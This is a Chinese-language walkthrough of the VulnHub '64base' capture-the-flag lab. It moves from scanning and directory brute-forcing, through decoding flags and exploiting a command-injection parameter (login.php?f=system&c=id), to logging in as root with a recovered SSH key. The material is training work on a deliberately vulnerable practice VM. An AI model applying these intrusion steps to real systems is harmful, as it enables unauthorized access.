
              vulnhub    64base靶场练习指南      经典boot2root练习
1.信息收集：IP  端口
arp-scan -l                                         初步网段扫描
netdiscover -r 192.168.56.0/24
nmap 192.168.56.0/24            
端口：22ssh      80http     4899radmin
靶场IP  192.168.56.103   80端口打开  http://192.168.56.103验证是否正常打开
  深度扫描：nmap -sT -T4 -p- 192.168.56.103     获得新端口   62964unkown

            网页寻找信息  1.dmlldyBzb3VyY2Ug00QK ----- 64base解码后：view source ;D
                                 2.Only respond if you are a real Imperial-Class BountyHunter 
                                 3.IMPORTANT!!! USE SYSTEM INSTEAD OF EXEC TO RUN THE SECRET 5H377                                                                   
网页右键查看源码    找到十六进制码        5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a  

解码后获得Base64：ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==
再解码获得第一个flag： 
 
             flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}


2.     第一个flag再次base64解码NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==

                 得到以下内容    64base:Th353@r3N0TdaDr01DzU@reL00K1ing4        貌似用户和密码
   目录爆破寻找隐藏目录路径（如 /admin、/secret）   
                              dirb http：//192.168.56.103 | grep "CODE:200"      200正常访问
                              找到了robots.txt文件     http://192.168.56.103/robots.txt

换思路   code 401 授权访问           dirb http：//192.168.56.103 | grep "CODE:401"  
找到了admin试图输入用户和密码，登录失败
再换思路回到robots.txt里面很多文件      提取里面所有文件形成进行爆破
             wget http://192.168.56.103 -rq -O base64.out  收集网站信息
             html2dic base64.out|sort -u > base64.dict        生成字典
             wc -l base64.dict                                             统计数据条数（可选）结果12845条
            
             dirb http：//192.168.56.103 base64.dict | grep "CODE:401"   跑字典
               找到以下结果:      + http://192.168.56.103/admin (CODE:401|SIZE:461)
                                        + http://192.168.56.103/Imperial-Class (CODE:401|SIZE:461)
                                         网页访问后输入用户和密码：http://192.168.56.103/Imperial-Class/
                                         虽然登录成功但是显示失败    [☠] ERROR: incorrect path!.... TO THE DARK SIDE!
                                         但是回想到最初的信息收集页面有一句话    第二句话可以倒回去看看
            网页寻找信息  1.dmlldyBzb3VyY2Ug00QK ----- 64base解码后：view source ;D
                                 2.Only respond if you are a real Imperial-Class BountyHunter    
                                         得到新路径http://192.168.56.103/Imperial-Class/BountyHunter/
                                         登录成功之后路径又变成了http://192.168.56.103/Imperial-Class/BountyHunter/index.php
                                         那就右键查看一下源码吧

                     源码里面有id  5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756
                                     id  584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
                                     basictoken=52714d544a54626d51315a45566157464655614446525557383966516f3d0a
                     三个码连在一起又是十六进制转成base64
                                       得到：ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo=
                                   再进行解码：获得第二个flag

                     flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}


3.         解码第二个flag的内容得到一个网站：https://www.youtube.com/watch?v=vJwytFWA8uA
                   这是一个YouTube的视频，在视频的低40秒左右有一个网址，www.youburp.com  
                   配置burp suite和网址的代理
                   因此的到提示，需要在正确的登录界面进行抓包，使用工具burpsuite抓到post包，然后重放，放行
                   在Response包里面可以看到flag3

                   flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}

4.         解码第三个flag base64
                得到新的信息：53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&c=id
                rec 远程命令执漏洞  
                 login.php?f=exec&c=id加入网页中显示失败，回想最初的信息收集第三句话
                 3.IMPORTANT!!! USE SYSTEM INSTEAD OF EXEC TO RUN THE SECRET 5H377  
                     将exec替换成system，成功
                    http://192.168.56.103/Imperial-Class/BountyHunter/login.php?f=system&c=id
              得到flag4和新的信息

                 uid=1001(64base) gid=1001(64base) groups=1001(64base)

                 flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}

网页信息
[64base Command Shell]

flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}

Debian GNU/Linux 8 \n \l

Tue Jul 28 12:15:43 BST 2026
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
          inet addr:192.168.56.103  Bcast:192.168.56.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe68:e7f8/64 Scope:Link

uid=1001(64base) gid=1001(64base) groups=1001(64base)



5.          解码第四个flag base64
               得到新的信息：64base:64base5h377        貌似又是用户和密码

    uid=1001(64base) 用户，看可不可以ssh登录
     ssh 64base@192.168.56.103   连接失败，回想信息收集，可能是端口问题       62964unkown
     ssh 64base@192.168.56.103 -p 62964    可以登录但是密码错误，说明ssh连接的端口修改过，不是原来的22，密码还未知

           64base5h377   那就再kali里面进行编码
           echo "64base5h377" | base64                得到编码：NjRiYXNlNWgzNzcK
           有没有可能试一试就是密码呢？   输入之后成功登录64bsae账户
           然后输入基本指令 cat whomai id都显示指令不存在     那就是env查看坏境变量echo
           echo $PATH/* 里面有很多文件，其中就有base64           ls有个well_done_:D

           那就
             base64 well_done_:D   有很大一串数据
             base64 well_done_:D | base64 --decode        有一副机器人对话场景
             echo $PATH/*                 观察里面有/var/alt-bin/droids
           那就继续
             droids                             kali屏幕很大一串的数字流图画  貌似没思路退出
             重新手打echo $PATH/*     发现显示内容和之前不一样
             id   这次可以用指令了         显示uid=1001(64base) gid=1001(64base) groups=1001(64base)
                  到了这里发现之前网页见过，那就再kali里面探索，看网页
           那就继续  cd /var/www
                          ls                         看到了一个html文件，前端网页的文件
                          cd html                
                          ls                         看到了很多文件夹目录，说不定flag就藏在这里面
            那就继续挑选admin ，back-     back无法查看
                          file admin
                          cd admin
                          ls                         发现了两个东西index.php     S3cR37
                          cat index.php         还是机器人图形
                          ls
                          file  S3cR37
                          ls                           这里得到了第五个flag

                  
                      flag5{TG9vayBJbnNpZGUhIDpECg==}

6.           解码第五个flag base64
                       得到新的信息：    Look Inside! :D
                  然后继续
                         file flag5{TG9vayBJbnNpZGUhIDpECg==}
                         jpg图片
                        strings  flag5{TG9vayBJbnNpZGUhIDpECg==}                将其变为字符串
                        strings  flag5{TG9vayBJbnNpZGUhIDpECg==} | /usr/bin/head

echo"4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a" | xxd -p -r | base64 --decode
思路：echo "你的十六进制串" | xxd -r -p | base64 -d > /tmp/ssh.key

 
得到密钥文件： cd /tmp      ls    存在ssh.key文件          /usr/bin/head -100 ssh.key查看完整密钥
然后尝试root用户登录：
     ssh root@192.168.56.103 -p 62964 -i ssh.key         貌似权限不够
     chmod 600 ssh.key                                               加权
     权限够了，但是还是不知道密码。
     现在如何获得密码，还有图片可以看长什么样，那就把图片复制出去
     chmod 600 ssh.key 
     ls
     cd /var/www/html/admin/S3cR37/
     /var/www/html/admin/S3cR37/ file flag5{TG9vayBJbnNpZGUhIDpECg==}
    scp ./flag* xiajie@192.168.56.101:/home/xiajie/flag5.jpg    输入密码123456    
     图形化界面重新开一个新窗口kali直接：xdg-open /home/xiajie/flag5.jpg
                        图片首页内容：
                                         usetheforce  疑似密码
     service ssh start
     service ssh status  #这两个是开启远程连接
     
     exiftool /home/xiajie/flag5.jpg      查看图片内容  无可用信息
      ssh -p 62964 root@192.168.56.103 -i /tmp/ssh.key   
              再次尝试登录  usetheforce     这个作为密码登录成功得到flag6               flag6就是密钥加密码得到的

flag6{NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}



7.图纸获得
    echo "NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK" | base64 -d

得到：4e546b325a4451324e324531595455304e546b7a4d4451354e444d7a4d545a694e446b304d7a4d354d7a49314f5455344e446b334e6a59794e44637a4f545a684e546b314e7a63334e7a5930597a5a6b4e7a677a4d5459784d7a49314e6a4d344e6a49304e7a55324e3245324d7a63354d7a55334f5456684e5463304e6a637a4e444d324e7a4e6b4d32517759516f3d0a

然后echo "上面十六的进制" | xxd -r -p | base64 -d
得到：
596d467a5a5459304943316b49433932595849766247396a595777764c6d7831613256386247567a637935795a57467343673d3d0a

然后再echo "上面十六的进制" | xxd -r -p | base64 -d
得到：base64 -d /var/local/.luke|less.real
然后直接查看得到图纸



            

     

                      






    



 
 

                  

 
  
                                 
